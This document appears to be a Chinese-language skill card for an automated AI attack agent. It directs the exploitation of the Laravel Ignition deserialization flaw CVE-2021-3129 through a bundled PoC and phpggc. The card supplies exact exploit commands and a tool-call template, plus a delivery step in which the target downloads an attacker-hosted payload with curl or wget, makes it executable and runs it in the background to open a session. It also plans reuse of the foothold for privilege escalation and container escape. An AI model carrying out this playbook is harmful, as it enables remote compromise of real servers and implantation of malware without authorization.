---
name: laravel-ignition-rce
handover: runtime
description: 对开启调试的 Laravel Ignition 接口完成反序列化命令执行并取得回显，必要时交付一条容器内会话引用。适用：绑定图给定的方法与目标；先观察产品与调试面，再由模型选择变体并逐动作构造。
metadata:
  predicates:
  - public_application_initial
  - laravel
  - T1190
  platforms:
  - linux
  keywords:
  - Laravel Ignition RCE
  - Laravel debug RCE
  - CVE-2021-3129
  - exploit.laravel_ignition_rce
  - method
  - position
  - http
  - code
  - public_application_initial
  - laravel
  - T1190
  - ignition
  - rce
  resources: []
  categories:
  - action-method
  aliases:
  - Laravel
  - Ignition
  - CVE-2021-3129
  - phpggc
  parameters:
  - host
  - url
  when:
    service: laravel
  requires: []
  excludes: []
  carriers:
  - kali
  - shell
serves:
- laravel
- CVE-2021-3129
- publicApplicationExploit
materials:
- poc_path
- phpggc_path
---

## 适用场景

目标为受影响版本的 Laravel 应用：Ignition 低于修复版本、`APP_DEBUG=true`，且调试执行入口可达。执行点须能访问目标 HTTP，并具备生成 gadget 链所需的工具；本卡随附 PoC，不需要凭据。

- 站点无 Laravel 特征、Ignition 已升级或调试开关关闭时不适用。
- 探测参考：对调试执行入口发 `GET` 返回 405/422 可作为接口存在的线索；`GET` 返回 404 不能单独排除（该入口由 POST 触发）。
- 先观察产品与调试面（位置与入口），这次观察同时确定可用的 `target_url`；再由现场证据选变体（直接命令回显 / 会话交付），两类变体共用同一执行链。`target_url` 来自这次前置观察，不自己新造端点。
- 产品、版本与调试面事实按图固定的 `task.source_position` 核验观察视角（控制端规范为 `base`）；可达性与容器身份仍使用方法默认视角，观察声明不改变工具实际执行点。
- 输入与工具面：图给 `target_url`；运行侧给 `command`（**不得杜撰**）；模型现场决定的输入：无；工具面 `http`、`code`（本卡路线要用 `code` 跑随卡 PoC）。工具用法与坑点见 `skills/_tooling/http-client.md`。

## 参数

- 输入 `target_url`：来自 model
- 输入 `command`：来自 runtime（可选）
- 输入 `poc_path`：来自 config（可选）
- 交付：evidence、session（节点要求会话时）
- 公开运行值（来自运行层，**不得自己编**）：`delivery_callback_host`、`delivery_callback_port`、`delivery_fetch_port`、`delivery_work_dir`
- 执行位置：position
- 可用工具：`cmd`、`code`、`http`、`stage`、`msf`
- 图适用：case=public_application_initial；service=laravel；technique=T1190；本卡 `serves`：`laravel`、`CVE-2021-3129`、`publicApplicationExploit`

## 步骤

**进入条件（先看这条）**：本卡需要「适用场景」里声明的输入（目标、地址/端口、平台、执行面）已经由运行层给出；缺输入就先说明缺什么，不要换方法硬凑，也不要去起监听或新建会话。

**PoC 与 gadget 链工具由部署推送到执行点**（`materials` 解析出的 `poc_path` / `phpggc_path`），仓库里没有随卡脚本、目标上也不会预先存在。
先按参数区给出的值确认这两个路径：**用一次只读 `ls -l <poc_path> <phpggc_path>` 确认即可**（本部署离线扫掠实测：值缺失时模型会去 `find / -name 'CVE-2021-3129*'` 满盘找，三次耗尽重试把节点判失败）。
`poc_path` 或 `phpggc_path` 为空、或确认不存在时，**直接报告缺哪个值/哪个文件**并按"不确定"处理，不要满盘搜索、不要改用自写 HTTP 请求替代本卡路线。

**一条一个动作块；有依赖的步骤绝不合并。**

工具优先，沿用既有工具与模块：gadget 链生成工具把命令放进 phar 元数据（链选型受 PHP 版本影响，先列可用链，换链只调整参数）；既有利用模块沿用原卡列出的实现，换实现不改判据。

本卡路线：完成必要的输入检查后，**按下面命令模板调用 `poc_path` 指向的随卡 PoC**，完成既定五步链（清理日志 → 写入 payload → 伪造 phar 头 → 触发反序列化 → 执行命令）；**不得用自写 HTTP 请求替代该路线**。若 PoC 调用失败，保留调用回执并按本卡失败处理规则处理；**不得用"写文件"这一部分效果交付命令执行结论**。PoC 回执只证明使用了指定路线，节点是否成立仍由判据决定。当前 fixed 入口仍调用既有 PoC，不增加自动切换工具的逻辑。

```sh
python3 <poc_path> -u http://<host>/ -c '<command>' [--phpggc <phpggc_path>] [--timeout <sec>]
```

输入：`target_url` 来自图，对应 `-u <url>`，须为站点根、**不带调试入口路径**；`command` 来自运行现场，对应 `-c <command>`，输出重定向到站点目录下的文件后取回；`poc_path` 来自执行端配置；`<m>` 由执行器提供，用于核对本次调用的命令输出。中性占位示例：

```sh
python3 <poc_path> -u http://<host>/ -c 'echo <m>; id; hostname'
```

对应的请求形状（在控制端执行一次，不要把整段 shell 当成会话命令）：

```text
{"tool":"run_command","target":"kali","arguments":{"interpreter":"bash","command":"python3 <poc_path> -u http://<host>/ -c 'echo <m>; id; hostname' --phpggc <phpggc_path>","timeout":120}}
```

PoC 的执行点路径：以运行层给的 `poc_path` 为准；`poc_path` 没给时先用一次**只读** `ls` 在运行层材料目录里查找，找不到就记未知，不要猜固定路径，也不要把 `<poc_path>` 字面量当参数。`phpggc` 同理：优先用运行层给的 `phpggc_path`；没给时用一次只读查询（`command -v phpggc` 或 `ls` 常见目录）拿到真实路径再执行；确认不到就按“环境缺工具”如实报缺，不静默换实现。目标路径拼法（无尾斜杠）、marker 口径与判据**不可更改**。

**入口复用（本卡留下的可复用入口）**：本卡证明通过后，同一入口按卡面的 `provides_position` 声明登记成**可复用的命令入口** —— 后续步骤（同一隔离环境内的提权、逃逸等）的每条命令都按冻结配方走**一次请求**。命令作为**文本**传给入口客户端，目标侧怎么执行由它决定（运行层不猜目标平台）；入口没有常驻进程，跨请求不保留工作目录/环境变量/交互输入，也不保证远端退出码（拿不到就记未知）。入口**每次使用都要重新观测**：连不上就如实失败，不会把入口链再打一遍。

**节点要求会话时（本节点产出 `execCode(<容器>, www_data)`，必须交一条会话）**：命令回显只证明入口可用，**不能替代会话**。按下面五步走，一步一发：

**监听与弹头由运行层预置（本卡不再造子弹、不再起监听）**：运行层已按目标平台选好`delivery_payload`、分配回调端口、武装 handler，并用同一 payload 和同一端口生成了弹头。本卡只使用 `delivery_stager_path`、`delivery_artifact_url`、`delivery_remote_path`、`delivery_callback_host`、`delivery_callback_port`。

6. **起取件台（`cmd`，在控制端，一发）**：

   ```sh
   {"tool":"serve_file","target":"kali","arguments":{"directory":"<delivery_work_dir>","port":<delivery_fetch_port>}}
   ```

7. **用本卡入口取件并起载荷（`cmd`，在控制端，一发）**：先用一次只读探测确认目标上可用的取件客户端（`command -v curl wget python3`），再按本卡既有路线走**一次 PoC 请求**执行下面这条（curl 与 wget 二选一，取探测到的那条）：

   ```sh
   python3 <poc_path> -u http://<host>/ -c '(curl -fsS <delivery_artifact_url> -o <delivery_remote_path> || wget -q <delivery_artifact_url> -O <delivery_remote_path>) && chmod +x <delivery_remote_path> && (setsid <delivery_remote_path> >/dev/null 2>&1 </dev/null &) && echo agv-payload-started'
   ```

   回执须含 `agv-payload-started`。

8. **收尾**：按 `citations` 引本次回执，然后 `finish`。**会话由运行层认领、登记并探活，本卡不自己登记会话**；只做到命令回显、没有会话就是**没完成**。


**本卡的完成依据是「交付段」最后一步的回执**（载荷被目标取到并启动 / 会话已交付）：命令回显、PoC 成功、文件读取、身份证据都只是**中间观察**，**不能**用来判 `action_complete=true`。拿到交付段最后一步的回执即判 `passed` 且 `action_complete=true`，**不要再追加任何「确认会话」的探测**（监听列表、连接数、端口都不是完成依据）；会话的认领、登记与探活由运行层负责，它认领不到会**如实记录未确认**，那不是让你在本卡里继续试的理由。


## 完成依据

**`finish.verdict` 判本卡要求的事实是否成立（本次命令执行是否拿到可引用的包裹回显），不是“PoC 是否跑完”。**

判定沿用 freshness、target、effect 三个阻断闸，`identity_rule=null`。

- **freshness**：核对本次调用及原始输出中的 marker（marker 由 `call_id` 派生）。
- **target**：核对目标归属，沿用 `target_url` 字段；原有的主机名与 HTTP 响应核对不变。
- **effect**：沿用注册规则 `wrapped_output_present`，核对本次命令的包裹回显。

证据字段：`call_id`、`target_url`、`command_output`，原始输出为 `stdout`；`command_output` 保留 marker 区间内容。

- **pass**：三个阻断闸均为 pass。
- **unsatisfied**：任一阻断闸返回 unsatisfied，按既有聚合规则判定（例如回执完整却明确没有本次命令输出）。
- **uncertain**：没有阻断闸返回 unsatisfied，但存在缺失或不确定的证据。命令输出被错误页吞掉时，使用落盘文件经 `GET` 回读的内容；直接回显与文件回读均拿不到时为 uncertain，**不补猜证据**。

## 失败条件

- **停止边界：本卡一次调用只走上面那条五步链；完成即结束，不由本卡重试、追加动作或换卡。**
- 调试入口带尾斜杠会在部分前端下触发 301，把 POST 降级成 GET，表现为链转换失败；沿用无尾斜杠路径。
- 五步链中间的日志写入与头部伪造两步返回 500 属于既有正常情况，不能据此判失败。
- 取得命令执行后的身份通常是 Web 服务账户；容器内提权属于另一条边，本卡不据此断言 root。
- 链执行会清写日志，并在站点目录留下用于回读的文件；日志可能残留 payload 字节。清理沿用同一条链（第二次执行删除与清空），不增加清理步骤或参数。
- 会话交付变体会落地材料并交付会话引用；本卡的通过只证明命令回显成立，**会话可用性由会话卡另行观察**。

[共享执行规则](../../src/skills/templates/execution_rules.txt)
